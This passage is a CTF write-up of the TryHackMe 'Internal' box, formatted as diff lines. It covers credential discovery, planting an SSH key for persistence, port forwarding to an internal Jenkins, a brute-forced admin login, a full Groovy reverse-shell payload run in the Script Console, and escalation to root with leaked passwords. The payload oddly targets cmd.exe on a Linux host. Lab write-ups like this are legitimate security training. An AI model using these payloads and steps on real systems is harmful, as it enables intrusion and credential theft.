+after enumeration i find an important file in /opt directory
+
+
+
+root@kali:/home~|#| sudo nc ~|-|lvnp 1231
+listening on [any] 1231 ...
+connect to [10.10.132.80] from (UNKNOWN) [10.10.93.161] 45196
+ls
+bin
+boot
+dev
+etc
+home
+lib
+lib64
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+sys
+tmp
+usr
+var
+
+ofter seaching for user flag i cant ifnd it XD
+
+cd /opt
+www~|-|data@internal:/opt$ ls    
+ls
+containerd  wp~|-|save.txt
+www~|-|data@internal:/opt$ cat wp~|-|save.txt
+cat wp~|-|save.txt
+Bill,
+ 
+Aubreanna needed these credentials for something later.  Let her know you have them and where they are.
+ 
+aubreanna:bubb13guM!@~|#|123
+
+
+
+try this credentials to upgare as aubreanna
+
+www~|-|data@internal:/opt$ su aubreanna    
+su aubreanna
+Password: bubb13guM!@~|#|123
+ 
+aubreanna@internal:/opt$ id
+id
+uid~|=|1000(aubreanna) gid~|=|1000(aubreanna) groups~|=|1000(aubreanna),4(adm),24(cdrom),30(dip),46(plugdev)
+aubreanna@internal:/opt$ whoami 
+whoami
+aubreanna
+
+
+
+user flag
+
+
+aubreanna@internal:/opt$ cd /home/aubreanna
+cd /home/aubreanna
+aubreanna@internal:~$ ls ~|-|la
+ls ~|-|la
+total 56
+drwx~|-|~|-|~|-|~|-|~|-|~|-| 7 aubreanna aubreanna 4096 Aug  3  2020 .
+drwxr~|-|xr~|-|x 3 root      root      4096 Aug  3  2020 ..
+~|-|rwx~|-|~|-|~|-|~|-|~|-|~|-| 1 aubreanna aubreanna    7 Aug  3  2020 .bash_history
+~|-|rwx~|-|~|-|~|-|~|-|~|-|~|-| 1 aubreanna aubreanna  220 Apr  4  2018 .bash_logout
+~|-|rwx~|-|~|-|~|-|~|-|~|-|~|-| 1 aubreanna aubreanna 3771 Apr  4  2018 .bashrc
+drwx~|-|~|-|~|-|~|-|~|-|~|-| 2 aubreanna aubreanna 4096 Aug  3  2020 .cache
+drwx~|-|~|-|~|-|~|-|~|-|~|-| 3 aubreanna aubreanna 4096 Aug  3  2020 .gnupg
+drwx~|-|~|-|~|-|~|-|~|-|~|-| 3 aubreanna aubreanna 4096 Aug  3  2020 .local
+~|-|rwx~|-|~|-|~|-|~|-|~|-|~|-| 1 root      root       223 Aug  3  2020 .mysql_history
+~|-|rwx~|-|~|-|~|-|~|-|~|-|~|-| 1 aubreanna aubreanna  807 Apr  4  2018 .profile
+drwx~|-|~|-|~|-|~|-|~|-|~|-| 2 aubreanna aubreanna 4096 Aug  3  2020 .ssh
+~|-|rwx~|-|~|-|~|-|~|-|~|-|~|-| 1 aubreanna aubreanna    0 Aug  3  2020 .sudo_as_admin_successful
+~|-|rwx~|-|~|-|~|-|~|-|~|-|~|-| 1 aubreanna aubreanna   55 Aug  3  2020 jenkins.txt
+drwx~|-|~|-|~|-|~|-|~|-|~|-| 3 aubreanna aubreanna 4096 Aug  3  2020 snap
+~|-|rwx~|-|~|-|~|-|~|-|~|-|~|-| 1 aubreanna aubreanna   21 Aug  3  2020 user.txt
+aubreanna@internal:~$ cat us
+cat user.txt 
+THM{D0n&apos;T_C0Py~|-|AnD~|-|PaSt}
+
+
+
+
+
+Root Flag
+
+try to see if there any way to privilege escalation
+
+enumeration
+
+
+
+aubreanna@internal:~$ sudo ~|-|l
+sudo ~|-|l
+[sudo] password for aubreanna: bubb13guM!@~|#|123
+ 
+Sorry, user aubreanna may not run sudo on internal.
+aubreanna@internal:~$ ls ~|-|la
+ls ~|-|la
+total 56
+drwx~|-|~|-|~|-|~|-|~|-|~|-| 7 aubreanna aubreanna 4096 Aug  3  2020 .
+drwxr~|-|xr~|-|x 3 root      root      4096 Aug  3  2020 ..
+~|-|rwx~|-|~|-|~|-|~|-|~|-|~|-| 1 aubreanna aubreanna    7 Aug  3  2020 .bash_history
+~|-|rwx~|-|~|-|~|-|~|-|~|-|~|-| 1 aubreanna aubreanna  220 Apr  4  2018 .bash_logout
+~|-|rwx~|-|~|-|~|-|~|-|~|-|~|-| 1 aubreanna aubreanna 3771 Apr  4  2018 .bashrc
+drwx~|-|~|-|~|-|~|-|~|-|~|-| 2 aubreanna aubreanna 4096 Aug  3  2020 .cache
+drwx~|-|~|-|~|-|~|-|~|-|~|-| 3 aubreanna aubreanna 4096 Aug  3  2020 .gnupg
+drwx~|-|~|-|~|-|~|-|~|-|~|-| 3 aubreanna aubreanna 4096 Aug  3  2020 .local
+~|-|rwx~|-|~|-|~|-|~|-|~|-|~|-| 1 root      root       223 Aug  3  2020 .mysql_history
+~|-|rwx~|-|~|-|~|-|~|-|~|-|~|-| 1 aubreanna aubreanna  807 Apr  4  2018 .profile
+drwx~|-|~|-|~|-|~|-|~|-|~|-| 2 aubreanna aubreanna 4096 Aug  3  2020 .ssh
+~|-|rwx~|-|~|-|~|-|~|-|~|-|~|-| 1 aubreanna aubreanna    0 Aug  3  2020 .sudo_as_admin_successful
+~|-|rwx~|-|~|-|~|-|~|-|~|-|~|-| 1 aubreanna aubreanna   55 Aug  3  2020 jenkins.txt
+drwx~|-|~|-|~|-|~|-|~|-|~|-| 3 aubreanna aubreanna 4096 Aug  3  2020 snap
+~|-|rwx~|-|~|-|~|-|~|-|~|-|~|-| 1 aubreanna aubreanna   21 Aug  3  2020 user.txt
+aubreanna@internal:~$ cd .sudo_as_admin_successful
+cd .sudo_as_admin_successful
+bash: cd: .sudo_as_admin_successful: Not a directory
+aubreanna@internal:~$ cat .sudo_as_admin_successful
+cat .sudo_as_admin_successful
+
+
+cheack if there any internal network !
+
+note that in the same directory of user falg there is a file called jenkins.txt
+
+Jenkins is an open source automation server. It helps automate the parts of software development related to building, testing, and deploying, facilitating continuous integration and continuous delivery. It is a server-based system that runs in servlet containers such as Apache Tomcat. It supports version control tools, including AccuRev, CVS, Subversion, Git, Mercurial, Perforce, ClearCase and RTC, and can execute Apache Ant, Apache Maven and sbt based projects as well as arbitrary shell scripts and Windows batch commands.
+
+so read the file !
+
+aubreanna@internal:~$ cat jenkins.txt 
+Internal Jenkins service is running on 172.17.0.2:8080
+
+
+
+  Ip:Port!
+so cheah netstat
+
+
+aubreanna@internal:~$ netstat ~|-|tulp
+netstat ~|-|tulp
+(Not all processes could be identified, non~|-|owned process info
+ will not be shown, you would have to be root to see it all.)
+Active Internet connections (only servers)
+Proto Recv~|-|Q Send~|-|Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 localhost:mysql         0.0.0.0:*               LISTEN      ~|-|                   
+tcp        0      0 localhost:http~|-|alt      0.0.0.0:*               LISTEN      ~|-|                   
+tcp        0      0 localhost:domain        0.0.0.0:*               LISTEN      ~|-|                   
+tcp        0      0 0.0.0.0:ssh             0.0.0.0:*               LISTEN      ~|-|                   
+tcp        0      0 localhost:43329         0.0.0.0:*               LISTEN      ~|-|                   
+tcp6       0      0 [::]:http               [::]:*                  LISTEN      ~|-|                   
+tcp6       0      0 [::]:ssh                [::]:*                  LISTEN      ~|-|                   
+udp        0      0 localhost:domain        0.0.0.0:*                           ~|-|                   
+udp        0      0 ip~|-|10~|-|10~|-|93~|-|161.:bootpc 0.0.0.0:*                           ~|-|                   
+
+
+
+
+as i expected there is a internal network if you need to confarm do curl command for 172.17.0.2:8080
+
+
+  Remember as we discover ports in scanning we have ssh port 22 !
+
+
+we can do ssh port forwarding
+
+on our machine
+
+
+
+root@kali:~/Desktop/importatnt~|#| ssh~|-|keygen
+Generating public/private rsa key pair.
+Enter file in which to save the key (/root/.ssh/id_rsa): /root/Desktop/importatnt/id_rsa
+Enter passphrase (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in /root/Desktop/importatnt/id_rsa
+Your public key has been saved in /root/Desktop/importatnt/id_rsa.pub
+The key fingerprint is:
+SHA256:DpdmntdA+PO2S4hLzL1dycPHsKnw2O6z2eSq2InFMOw root@kali
+The key&apos;s randomart image is:
++~|-|~|-|~|-|[RSA 3072]~|-|~|-|~|-|~|-|+
+|                 |
+|         .       |
+|        . .      |
+|       . +       |
+|      . S +   .  |
+|       @ B * o * |
+|        E B ~|=| X o|
+|       . B @.O o |
+|        + *+&amp;amp;~|=|o  |
++~|-|~|-|~|-|~|-|[SHA256]~|-|~|-|~|-|~|-|~|-|+
+root@kali:~/Desktop/importatnt~|#| ls ~|-|la
+total 16
+drwxr~|-|xr~|-|x 2 root root 4096 Feb 10 12:09 .
+drwxr~|-|xr~|-|x 4 root root 4096 Feb 10 12:09 ..
+~|-|rw~|-|~|-|~|-|~|-|~|-|~|-|~|-| 1 root root 2590 Feb 10 12:09 id_rsa
+~|-|rw~|-|r~|-|~|-|r~|-|~|-| 1 root root  563 Feb 10 12:09 id_rsa.pub
+root@kali:~/Desktop/importatnt~|#| cat id_rsa
+~|-|~|-|~|-|~|-|~|-|BEGIN OPENSSH PRIVATE KEY~|-|~|-|~|-|~|-|~|-|
+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
+ScVP31RHFyJIWfAAAACXJvb3RAa2FsaQE~|=|
+~|-|~|-|~|-|~|-|~|-|END OPENSSH PRIVATE KEY~|-|~|-|~|-|~|-|~|-|
+root@kali:~/Desktop/importatnt~|#| ls ~|-|la
+total 16
+drwxr~|-|xr~|-|x 2 root root 4096 Feb 10 12:09 .
+drwxr~|-|xr~|-|x 4 root root 4096 Feb 10 12:09 ..
+~|-|rw~|-|~|-|~|-|~|-|~|-|~|-|~|-| 1 root root 2590 Feb 10 12:09 id_rsa
+~|-|rw~|-|r~|-|~|-|r~|-|~|-| 1 root root  563 Feb 10 12:09 id_rsa.pub
+root@kali:~/Desktop/importatnt~|#| cat id_rsa.pub 
+ssh~|-|rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDAKpFX5RtdWxvLMB8TUiIbEcXbTHJFdsrad8tfGHhr6gHHytxZGzHJX7nTzYj8Fn60gvDFpzQDFU9QtalpJV7cTh18hK5ccDTJp90QIQ1LPznpjwdY05B/pWcSHRxETQAKXDqBl8/xGg6HPNCGLMRmTX6vpvG7TH9NRcoBt0Y1UyyLfXdtUNNg4glSorvebjoPnD+sP3Zyw3zhH2biMc2Vs6ytIIzo6iqHw2OjcWDEtDHOz7n+Z+GOAPBD8d5dj0Iz1XxqDw7CsYw24/cfBa9h8VDvmWf6kSBJIhlYuA4jqzxttep5o79IP6vJLQ+HVSGj7yQMBQhx9OvPPjot/b9ojVxsoCOeTLXsPB4N1JkF3ofUp0ETHEfQ+STucLkyErNM9Y/uqc5KVfqAUNDvkVJQghjFL29CQ8jd6YvOsGQFjPGyJKYelkAx9UdYCkVSHhc+Xfug2NZMg4qUhbpOLspSDnre7AB3FHuk8fJaeokRk9ArlzEOb+e1XaGNYSVWxR8~|=| root@kali
+
+
+  cahnge of id_rsa.pub permission to 600
+
+
+
+root@kali:~/Desktop/importatnt~|#| cat id_rsa.pub 
+ssh~|-|rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDAKpFX5RtdWxvLMB8TUiIbEcXbTHJFdsrad8tfGHhr6gHHytxZGzHJX7nTzYj8Fn60gvDFpzQDFU9QtalpJV7cTh18hK5ccDTJp90QIQ1LPznpjwdY05B/pWcSHRxETQAKXDqBl8/xGg6HPNCGLMRmTX6vpvG7TH9NRcoBt0Y1UyyLfXdtUNNg4glSorvebjoPnD+sP3Zyw3zhH2biMc2Vs6ytIIzo6iqHw2OjcWDEtDHOz7n+Z+GOAPBD8d5dj0Iz1XxqDw7CsYw24/cfBa9h8VDvmWf6kSBJIhlYuA4jqzxttep5o79IP6vJLQ+HVSGj7yQMBQhx9OvPPjot/b9ojVxsoCOeTLXsPB4N1JkF3ofUp0ETHEfQ+STucLkyErNM9Y/uqc5KVfqAUNDvkVJQghjFL29CQ8jd6YvOsGQFjPGyJKYelkAx9UdYCkVSHhc+Xfug2NZMg4qUhbpOLspSDnre7AB3FHuk8fJaeokRk9ArlzEOb+e1XaGNYSVWxR8~|=| root@kali
+
+
+
+on aubreanna machine
+
+
+aubreanna@internal:~$ cd .ssh
+cd .ssh
+aubreanna@internal:~/.ssh$ ls ~|-|la
+ls ~|-|la
+total 8
+drwx~|-|~|-|~|-|~|-|~|-|~|-| 2 aubreanna aubreanna 4096 Aug  3  2020 .
+drwx~|-|~|-|~|-|~|-|~|-|~|-| 7 aubreanna aubreanna 4096 Aug  3  2020 ..
+aubreanna@internal:~/.ssh$ echo &quot;ssh~|-|rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDAKpFX5RtdWxvLMB8TUiIbEcXbTHJFdsrad8tfGHhr6gHHytxZGzHJX7nTzYj8Fn60gvDFpzQDFU9QtalpJV7cTh18hK5ccDTJp90QIQ1LPznpjwdY05B/pWcSHRxETQAKXDqBl8/xGg6HPNCGLMRmTX6vpvG7TH9NRcoBt0Y1UyyLfXdtUNNg4glSorvebjoPnD+sP3Zyw3zhH2biMc2Vs6ytIIzo6iqHw2OjcWDEtDHOz7n+Z+GOAPBD8d5dj0Iz1XxqDw7CsYw24/cfBa9h8VDvmWf6kSBJIhlYuA4jqzxttep5o79IP6vJLQ+HVSGj7yQMBQhx9OvPPjot/b9ojVxsoCOeTLXsPB4N1JkF3ofUp0ETHEfQ+STucLkyErNM9Y/uqc5KVfqAUNDvkVJQghjFL29CQ8jd6YvOsGQFjPGyJKYelkAx9UdYCkVSHhc+Xfug2NZMg4qUhbpOLspSDnre7AB3FHuk8fJaeokRk9ArlzEOb+e1XaGNYSVWxR8~|=| root@kali&quot; &amp;gt;&amp;gt; authorized_keys
+~|&amp;lt;|rlzEOb+e1XaGNYSVWxR8~|=| root@kali&quot; &amp;gt;&amp;gt; authorized_keys
+aubreanna@internal:~/.ssh$ ls ~|-|la
+ls ~|-|la
+total 12
+drwx~|-|~|-|~|-|~|-|~|-|~|-| 2 aubreanna aubreanna 4096 Feb 10 12:10 .
+drwx~|-|~|-|~|-|~|-|~|-|~|-| 7 aubreanna aubreanna 4096 Aug  3  2020 ..
+~|-|rw~|-|rw~|-|r~|-|~|-| 1 aubreanna aubreanna  563 Feb 10 12:10 authorized_keys
+aubreanna@internal:~/.ssh$ 
+
+
+
+connect and port forwarding
+
+
+
+root@kali:~/Desktop/importatnt~|#| chmod 600 id_rsa.pub
+root@kali:~/Desktop/importatnt~|#| ssh ~|-|i id_rsa ~|-|L 8080:127.0.0.1:8080 aubreanna@internal.htb
+ssh: Could not resolve hostname internal.htb: Name or service not known
+root@kali:~/Desktop/importatnt~|#| cat /etc/hosts
+127.0.0.1       localhost
+127.0.1.1       kali
+10.10.93.161 internal.thm
+~|#| The following lines are desirable for IPv6 capable hosts
+::1     localhost ip6~|-|localhost ip6~|-|loopback
+ff02::1 ip6~|-|allnodes
+ff02::2 ip6~|-|allrouters
+root@kali:~/Desktop/importatnt~|#| ssh ~|-|i id_rsa ~|-|L 8080:127.0.0.1:8080 aubreanna@internal.thm
+The authenticity of host &apos;internal.thm (10.10.93.161)&apos; can&apos;t be established.
+ECDSA key fingerprint is SHA256:fJ/BlTrDF8wS8/eqyoej1aq/NmvQh79ABdkpiiN5tqE.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added &apos;internal.thm,10.10.93.161&apos; (ECDSA) to the list of known hosts.
+Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0~|-|112~|-|generic x86_64)
+ 
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+ 
+  System information as of Thu Feb 10 12:12:55 UTC 2022
+ 
+  System load:  0.08              Processes:              116
+  Usage of /:   64.9% of 8.79GB   Users logged in:        0
+  Memory usage: 39%               IP address for eth0:    10.10.93.161
+  Swap usage:   0%                IP address for docker0: 172.17.0.1
+ 
+  ~|=|&amp;gt; There is 1 zombie process.
+ 
+ 
+ * Canonical Livepatch is available for installation.
+   ~|-| Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+ 
+0 packages can be updated.
+0 updates are security updates.
+
+
+enumerat Jenkins
+
+At first cahnge BurpSuite port
+
+
+
+try to log in as we do berfore an intercept login request and brute foce the password.
+
+
+  admin:spongebob
+
+
+Revese shell in jenkins
+
+i find this article and this how to excute our code to get a revese shell 
+article 2
+
+Jenkins supports groovy script execution. i found this article
+
+execute groovy script in Jenkins
+
+
+  now go to Nodes
+  master
+  Script Console
+
+
+Now i need to get creat my reverse shell. i found revsh.groovy.
+
+Excute our payload to get reverse shell on nc
+
+String host~|=|&quot;localhost&quot;;
+int port~|=|8044;
+String cmd~|=|&quot;cmd.exe&quot;;
+Process p~|=|new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s~|=|new Socket(host,port);InputStream pi~|=|p.getInputStream(),pe~|=|p.getErrorStream(), si~|=|s.getInputStream();OutputStream po~|=|p.getOutputStream(),so~|=|s.getOutputStream();while(!s.isClosed()){while(pi.available()&amp;gt;0)so.write(pi.read());while(pe.available()&amp;gt;0)so.write(pe.read());while(si.available()&amp;gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+
+
+
+we get our reverse shell and as in aubreanna go to /opt directory to seach for and intersting files
+
+cd /opt
+ls
+note.txt
+cat node.txt
+cat: node.txt: No such file or directory
+cat note.txt
+Aubreanna,
+ 
+Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you 
+need access to the root user account.
+ 
+root:tr0ub13guM!@~|#|123
+
+
+Read Root flag
+
+aubreanna@internal:/var/backups$ su root
+Password: 
+root@internal:/var/backups~|#| cd /root/
+root@internal:~~|#| ll
+total 48
+drwx~|-|~|-|~|-|~|-|~|-|~|-|  7 root root 4096 Aug  3 13:16 ./
+drwxr~|-|xr~|-|x 24 root root 4096 Aug  3 01:31 ../
+~|-|rw~|-|~|-|~|-|~|-|~|-|~|-|~|-|  1 root root  193 Aug  3 20:01 .bash_history
+~|-|rw~|-|r~|-|~|-|r~|-|~|-|  1 root root 3106 Apr  9  2018 .bashrc
+drwx~|-|~|-|~|-|~|-|~|-|~|-|  2 root root 4096 Aug  3 02:23 .cache/
+drwx~|-|~|-|~|-|~|-|~|-|~|-|  3 root root 4096 Aug  3 02:23 .gnupg/
+drwxr~|-|xr~|-|x  3 root root 4096 Aug  3 01:53 .local/
+~|-|rw~|-|~|-|~|-|~|-|~|-|~|-|~|-|  1 root root 1071 Aug  3 13:16 .mysql_history
+~|-|rw~|-|r~|-|~|-|r~|-|~|-|  1 root root  148 Aug 17  2015 .profile
+drwx~|-|~|-|~|-|~|-|~|-|~|-|  2 root root 4096 Aug  3 01:40 .ssh/
+~|-|rw~|-|r~|-|~|-|r~|-|~|-|  1 root root   22 Aug  3 04:13 root.txt
+drwxr~|-|xr~|-|x  3 root root 4096 Aug  3 01:41 snap/
+root@internal:~~|#| cat root.txt 
+THM{D0n&apos;T_C0Py~|-|AnD~|-|PaSt}
+
+Give My Your Feedback.
+
+
+
+",
+            "wordcount": "2807",
+            "inLanguage": "en",
+            "dateCreated": "2022-02-11/",
+            "datePublished": "2022-02-11/",
+            "dateModified": "2022-02-11/",
+            "author": {
+                "@type": "Person",
+                "name": "Thiago Rossener",
+                
+                "image": "/assets/img/uploads/profile.png",
+                
+                "jobTitle": "Chief Editor",
+                "url": "https://h3x0s3.github.io//authors/thiagorossener/",
+                "sameAs": [
+                    "https://github.com/thiagorossener","https://www.facebook.com/thiagorossener","https://twitter.com/thiagorossener","https://medium.com/@thiagorossener","https://www.instagram.com/thiagorossener","https://www.linkedin.com/in/thiagorossener"
+                ]
+            },
+            "publisher": {
+                "@type": "Organization",
+                "name": "H3X0S3",
+                "url": "https://h3x0s3.github.io//",
+                "logo": {
+                    "@type": "ImageObject",
+                    "url": "https://h3x0s3.github.io//assets/img/blog-image.png",
+                    "width": "600",
+                    "height": "315"
+                }
+            },
+            "mainEntityOfPage": "True",
+            "genre": "tryhackme",
+            "articleSection": "tryhackme",
+            "keywords": ["tryhackme","CTF","WPsacn","Jenkins","groovy","Lateral movement","Port Forwarding","Reverse shell"]
+        }
+        </script>
+    </body>
+</html>
